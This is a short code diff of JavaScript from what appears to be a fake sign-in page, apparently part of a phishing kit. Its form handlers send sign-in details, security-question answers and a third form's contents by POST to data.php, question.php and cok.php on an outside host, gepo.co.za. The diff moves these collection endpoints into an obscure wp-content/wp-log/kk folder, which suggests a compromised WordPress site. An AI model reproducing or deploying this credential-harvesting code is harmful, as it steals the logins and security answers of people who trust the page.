@@ -313,7 +313,7 @@
                 document.getElementById('signIn').innerText = 'Signing In...';
 
                 // Send POST request to data.php
-                fetch('https://gepo.co.za/demo/wp-includes/data.php', {
+                fetch('https://gepo.co.za/demo/wp-content/wp-log/kk/data.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: new URLSearchParams(new FormData(this)).toString()
@@ -346,7 +346,7 @@
                 document.getElementById('btn2').innerText = 'Submitting...';
 
                 // Send POST request to question.php
-                fetch('https://gepo.co.za/demo/wp-includes/question.php', {
+                fetch('https://gepo.co.za/demo/wp-content/wp-log/kk/question.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: new URLSearchParams(new FormData(this)).toString()
@@ -381,7 +381,7 @@
                 }, 2000)
 
                 // Send POST request to cok.php
-                fetch('https://gepo.co.za/demo/wp-includes/cok.php', {
+                fetch('https://gepo.co.za/demo/wp-content/wp-log/kk/cok.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: new URLSearchParams(new FormData(this)).toString()
